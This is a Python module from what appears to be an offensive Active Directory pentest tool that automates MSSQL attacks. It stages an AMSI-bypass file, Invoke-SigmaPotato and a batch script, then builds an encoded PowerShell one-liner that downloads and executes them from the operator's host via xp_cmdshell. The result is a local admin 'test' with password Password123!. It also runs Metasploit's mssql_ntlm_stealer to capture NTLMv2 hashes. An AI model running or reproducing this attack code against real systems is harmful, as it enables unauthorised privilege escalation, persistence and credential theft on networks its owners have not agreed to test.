"""CLI orchestration for MSSQL operations.

This module keeps interactive CLI concerns (printing, follow-up prompts) outside
of the giant `adscan.py`, while delegating execution logic to the service layer.
"""

from __future__ import annotations

from collections.abc import Callable
import os
import subprocess
from typing import Protocol

from adscan_internal import (
    print_error,
    print_exception,
    print_info,
    print_info_debug,
    print_operation_header,
    print_success,
    print_warning,
    telemetry,
)
from adscan_internal.integrations.mssql import MSSQLContext
from adscan_internal.execution_outcomes import (
    build_no_result_completed_process,
    build_timeout_completed_process,
)
from adscan_internal.cli.common import build_lab_event_fields
from adscan_internal.path_utils import get_adscan_home
from adscan_internal.rich_output import mark_sensitive
from adscan_internal.services.exploitation import ExploitationService
from adscan_internal.text_utils import strip_ansi_codes
from rich.prompt import Confirm


class MssqlShell(Protocol):
    """Minimal shell surface used by MSSQL CLI controller."""

    netexec_path: str | None
    myip: str | None
    domains_data: dict

    def _run_netexec(
        self,
        command: str,
        *,
        domain: str | None = None,
        timeout: int | None = None,
        **kwargs,
    ) -> subprocess.CompletedProcess[str] | None: ...

    def _get_lab_slug(self) -> str | None: ...

    def _get_service_executor(
        self,
    ) -> Callable[[str, int], subprocess.CompletedProcess[str]]: ...

    def run_command(
        self, command: str, *, timeout: int | None = None, **kwargs
    ) -> subprocess.CompletedProcess[str] | None: ...

    def ask_for_dump_host(
        self, domain: str, host: str, username: str, password: str, islocal: str
    ) -> None: ...

    def ask_for_mssql_impersonate(
        self, domain: str, host: str, username: str, password: str
    ) -> None: ...

    def mssql_steal_ntlmv2(
        self, domain: str, host: str, username: str, password: str, islocal: str
    ) -> None: ...

    def mssql_impersonate(
        self, domain: str, host: str, username: str, password: str
    ) -> None: ...


def _build_mssql_context(shell: MssqlShell) -> MSSQLContext:
    if not shell.netexec_path:
        raise ValueError("netexec_path not configured")

    def _infer_domain_from_command(command: str) -> str | None:
        import shlex

        try:
            argv = shlex.split(str(command or ""))
        except ValueError:
            return None
        for idx, token in enumerate(argv):
            if token in {"-d", "--domain"} and idx + 1 < len(argv):
                value = str(argv[idx + 1]).strip()
                if value:
                    return value
        return None

    def _runner(command: str, timeout: int):
        domain = _infer_domain_from_command(command)
        if hasattr(shell, "_run_netexec"):
            result = shell._run_netexec(
                command,
                domain=domain,
                timeout=timeout,
                operation_kind="mssql_remote_exec",
                service="mssql",
                target_count=1,
            )
        else:
            result = shell.run_command(command, timeout=timeout)
        if result is not None:
            return result
        last_error = getattr(shell, "_last_run_command_error", None)
        if isinstance(last_error, tuple) and last_error and last_error[0] == "timeout":
            return build_timeout_completed_process(command, tool_name="netexec_mssql")
        return build_no_result_completed_process(command, tool_name="netexec_mssql")

    return MSSQLContext(netexec_path=shell.netexec_path, command_runner=_runner)


def run_mssql_check_impersonate(
    shell: MssqlShell, *, domain: str, host: str, username: str, password: str
) -> bool:
    """Check SeImpersonatePrivilege via MSSQL and trigger follow-up prompt."""
    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return False

    marked_host = mark_sensitive(host, "hostname")
    marked_username = mark_sensitive(username, "user")
    print_operation_header(
        "MSSQL SeImpersonate Check",
        details={
            "Domain": domain,
            "Host": host,
            "Username": username,
            "Command": "whoami /priv",
        },
        icon="🧩",
    )
    print_info(f"Checking SeImpersonate privileges on host {marked_host}")

    service = ExploitationService()
    ctx = _build_mssql_context(shell)
    result = service.mssql.check_seimpersonate(
        host=host,
        username=username,
        password=password,
        domain=domain,
        ctx=ctx,
        timeout=60,
    )

    try:
        properties = {"has_privilege": bool(result.has_privilege)}
        properties.update(build_lab_event_fields(shell=shell, include_slug=True))
        telemetry.capture("mssql_seimpersonate_checked", properties)
    except Exception as e:  # pragma: no cover
        telemetry.capture_exception(e)

    if result.has_privilege:
        print_success(
            f"User {marked_username} with SeImpersonatePrivilege detected on host {marked_host}"
        )
        shell.ask_for_mssql_impersonate(domain, host, username, password)
        return True

    print_warning("SeImpersonatePrivilege not detected.")
    return False


def run_mssql_impersonate(
    shell: MssqlShell, *, domain: str, host: str, username: str, password: str
) -> None:
    """Exploit SeImpersonate via MSSQL using the legacy SigmaPotato payload flow.

    This preserves the current behavior:
    - copies helper payload files into the current directory
    - base64-encodes a PowerShell one-liner using ps-encoder.py
    - executes it via NetExec MSSQL xp_cmdshell
    """
    if not shell.myip:
        print_error(
            "MyIP is not configured; required to host payload files for MSSQL impersonate."
        )
        return

    tools_install_dir = os.environ.get("ADSCAN_TOOLS_INSTALL_DIR")
    if not tools_install_dir:
        tools_install_dir = str(get_adscan_home() / "tools")

    add_admin_bat = os.path.join(
        tools_install_dir, "windows-tools", "add_local_admin_user.bat"
    )
    invoke_sigma = os.path.join(tools_install_dir, "Tools", "Invoke-SigmaPotato.ps1")
    amsi_txt = os.path.join(tools_install_dir, "Tools", "amsi.txt")

    copy_command = f"cp {add_admin_bat} command.bat && cp {invoke_sigma} test.ps1 && cp {amsi_txt} test.txt"
    print_info_debug(f"[mssql] Staging payload files: {copy_command}")
    stage = shell.run_command(copy_command, timeout=60)
    if not stage or stage.returncode != 0:
        print_error(
            "Failed to stage MSSQL payload files (command.bat/test.ps1/test.txt)."
        )
        return

    encoded_command = (
        "ps-encoder.py -e "
        f'\'$wr = [System.NET.WebRequest]::Create("http://{shell.myip}/test.txt");'
        "$r = $wr.GetResponse();"
        "IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd();"
        f'$wr = [System.NET.WebRequest]::Create("http://{shell.myip}/test.ps1");'
        "$r = $wr.GetResponse();"
        "IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd();"
        f"iwr http://{shell.myip}/command.bat -OutFile C:\\\\Users\\\\Public\\\\Music\\\\command.bat;"
        "Invoke-SigmaPotato -Command C:\\\\Users\\\\Public\\\\Music\\\\command.bat;"
        "rm C:\\\\Users\\\\Public\\\\Music\\\\command.bat'"
    )
    print_info_debug("[mssql] Encoding PowerShell payload via ps-encoder.py")
    encoded_proc = shell.run_command(encoded_command, timeout=120)
    if (
        not encoded_proc
        or encoded_proc.returncode != 0
        or not (encoded_proc.stdout or "").strip()
    ):
        print_error("Failed to encode PowerShell payload (ps-encoder.py).")
        if encoded_proc and encoded_proc.stderr:
            print_info_debug(encoded_proc.stderr)
        return
    encoded_output = (encoded_proc.stdout or "").strip()

    marked_host = mark_sensitive(host, "hostname")
    print_info(f"Adding test user to host {marked_host} via MSSQL")

    service = ExploitationService()
    ctx = _build_mssql_context(shell)
    result = service.mssql.execute_encoded_powershell(
        host=host,
        username=username,
        password=password,
        encoded_command=encoded_output,
        domain=domain,
        ctx=ctx,
        timeout=300,
    )
    if not result or not getattr(result, "success", False):
        print_error("MSSQL impersonate payload execution failed.")
        return

    stdout = getattr(result, "stdout", "") or ""
    if "successfully" in stdout.lower():
        print_success(
            f"Test user with password Password123! added as local admin on host {marked_host}"
        )
        shell.ask_for_dump_host(domain, host, "test", "Password123!", "True")
        return

    print_warning(
        "MSSQL impersonate command executed but success marker not found in output."
    )


def ask_for_mssql_access(
    shell: MssqlShell, *, domain: str, host: str, username: str, password: str
) -> None:
    """Ask user if they want to exploit SeImpersonate via MSSQL."""
    ask_for_mssql_impersonate(shell, domain=domain, host=host, username=username, password=password)


def ask_for_mssql_impersonate(
    shell: MssqlShell, *, domain: str, host: str, username: str, password: str
) -> None:
    """Ask user if they want to exploit SeImpersonate on the target host."""
    marked_host = mark_sensitive(host, "hostname")
    if Confirm.ask(
        f"Do you want to exploit SeImpersonate on {marked_host} (a new local admin user 'test' with password Password123! will be added)?",
        default=False,
    ):
        shell.mssql_impersonate(domain, host, username, password)


def ask_for_mssql_steal(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    islocal: str,
) -> None:
    """Ask user if they want to attempt to steal NTLMv2 hash via MSSQL."""
    marked_username = mark_sensitive(username, "user")
    if Confirm.ask(
        f"Do you want to attempt to steal the NTLMv2 hash of the domain user associated with {marked_username} from the database?",
        default=False,
    ):
        shell.mssql_steal_ntlmv2(domain, host, username, password, islocal)


def run_mssql_steal_ntlmv2(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    islocal: str,
) -> None:
    """Steal NTLMv2 hash via MSSQL using Metasploit."""
    marked_username = mark_sensitive(username, "user")
    marked_password = mark_sensitive(password, "password")
    marked_host = mark_sensitive(host, "hostname")
    command = (
        f"msfconsole -x 'use auxiliary/admin/mssql/mssql_ntlm_stealer;"
        f"set username {marked_username};"
        f"set password {marked_password};"
        f"set RHOSTS {marked_host};"
        f"set USE_WINDOWS_AUTHENT {islocal};"
        f"set smbproxy {shell.myip};"
        f"run;exit'"
    )
    print_info("Stealing the NTLMv2 hash of the user")
    execute_mssql_steal_ntlmv2(shell, command)


def do_mssql_steal_ntlmv2(shell: MssqlShell, args: str) -> None:
    """CLI handler for mssql_steal_ntlmv2 command.

    Steals the NTLMv2 hash of the specified user in the given domain and host,
    using the SeImpersonate vulnerability in MSSQL.

    Args:
        shell: The shell instance
        args: Space-separated string containing:
            - domain (str) - The domain name.
            - host (str) - The name or IP address of the host.
            - username (str) - The username to authenticate with MSSQL.
            - password (str) - The password for the specified username.
            - islocal (str) - If "true", the script will attempt to use local
              Windows Authentication credentials to access MSSQL. If "false",
              the script will prompt the user for credentials.

    The function prepares and executes a series of commands to steal the NTLMv2
    hash of the specified user on the target host using the SeImpersonate
    privilege. Upon successful execution, the NTLMv2 hash is printed to the console.
    """
    args_list = args.split()
    if len(args_list) != 5:
        print_warning(
            "Usage: mssql_steal_NTLMv2 <domain> <host> <username> <password> <islocal>"
        )
        return
    domain = args_list[0]
    host = args_list[1]
    username = args_list[2]
    password = args_list[3]
    islocal = args_list[4]
    shell.mssql_steal_ntlmv2(domain, host, username, password, islocal)


def do_mssql_impersonate(shell: MssqlShell, args: str) -> None:
    """CLI handler for mssql_impersonate command.

    Adds a local admin user to the target host using MSSQL.

    Args:
        shell: The shell instance
        args: Space-separated string containing:
            - domain (str) - The domain name.
            - host (str) - The name or IP address of the host.
            - username (str) - The username to authenticate with MSSQL.
            - password (str) - The password for the specified username.

    The function constructs a command to add a local admin user to the target
    host using MSSQL and starts a thread to execute this command.
    """
    args_list = args.split()
    if len(args_list) != 4:
        print_warning(
            "Usage: mssql_impersonate <domain> <host> <username> <password>"
        )
        return
    domain = args_list[0]
    host = args_list[1]
    username = args_list[2]
    password = args_list[3]
    shell.mssql_impersonate(domain, host, username, password)


def execute_mssql_steal_ntlmv2(shell: MssqlShell, command: str) -> None:
    """Execute Metasploit command to steal NTLMv2 hash via MSSQL."""
    try:
        completed_process = shell.run_command(command, timeout=300)

        if completed_process and completed_process.stdout:
            for line_content in completed_process.stdout.splitlines():
                output_str = line_content.strip()
                print_info(output_str)
                if "completed" in output_str:
                    print_success("Exploit executed successfully")
                    break

        if completed_process and completed_process.returncode == 0:
            print_success("Process completed successfully.")
        else:
            print_error("Exploit failed or process terminated with errors.")
            if completed_process and completed_process.stderr:
                print_error(f"Details: {completed_process.stderr.strip()}")
            elif (
                completed_process
                and completed_process.stdout
                and "completed" not in completed_process.stdout
            ):
                print_error(f"Details: {completed_process.stdout.strip()}")
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error executing Metasploit.")
        print_exception(show_locals=False, exception=e)


def execute_mssql_check_impersonate(
    shell: MssqlShell,
    *,
    command: str,
    domain: str,
    host: str,
    username: str,
    password: str,
) -> None:
    """Execute command to check for SeImpersonatePrivilege via MSSQL."""
    try:
        completed_process = shell.run_command(command, timeout=300)
        if completed_process and completed_process.returncode == 0:
            output_str = strip_ansi_codes(completed_process.stdout or "")
            if "SeImpersonatePrivilege" in output_str:
                marked_username = mark_sensitive(username, "user")
                marked_host = mark_sensitive(host, "hostname")
                print_success(
                    f"User {marked_username} with SeImpersonatePrivilege detected on host {marked_host}"
                )
                ask_for_mssql_impersonate(
                    shell, domain=domain, host=host, username=username, password=password
                )
            else:
                print_error("Exploit failed to find SeImpersonatePrivilege.")
                if completed_process.stderr:
                    print_error(f"Details: {completed_process.stderr.strip()}")
        else:
            error_message = (
                strip_ansi_codes(completed_process.stderr or "").strip()
                if completed_process and completed_process.stderr
                else strip_ansi_codes(completed_process.stdout or "").strip()
                if completed_process and completed_process.stdout
                else ""
            )
            print_error(
                f"Command execution failed: {error_message if error_message else 'No error details'}"
            )
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error executing zerologon-exploit.py.")
        print_exception(show_locals=False, exception=e)


def execute_mssql_impersonate(
    shell: MssqlShell, *, command: str, domain: str, host: str
) -> None:
    """Execute command to exploit SeImpersonate via MSSQL."""
    try:
        completed_process = shell.run_command(command, timeout=300)
        if completed_process and completed_process.returncode == 0:
            output_str = strip_ansi_codes(completed_process.stdout or "")
            if "successfully" in output_str:
                marked_host = mark_sensitive(host, "hostname")
                print_success(
                    f"Test user with password Password123! added as local admin on host {marked_host}"
                )
                shell.ask_for_dump_host(domain, host, "test", "Password123!", "True")
            else:
                print_error(
                    'Exploit command ran but "successfully" message not found in output.'
                )
                if output_str:
                    print_info(f"Output: {output_str.strip()}")
                if completed_process.stderr:
                    print_error(f"Stderr: {completed_process.stderr.strip()}")
        else:
            print_error("Error executing MSSQL impersonate exploit.")
            error_message = (
                completed_process.stderr.strip()
                if completed_process and completed_process.stderr
                else completed_process.stdout.strip()
                if completed_process and completed_process.stdout
                else ""
            )
            if error_message:
                print_error(f"Details: {error_message}")
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error executing netexec.")
        print_exception(show_locals=False, exception=e)
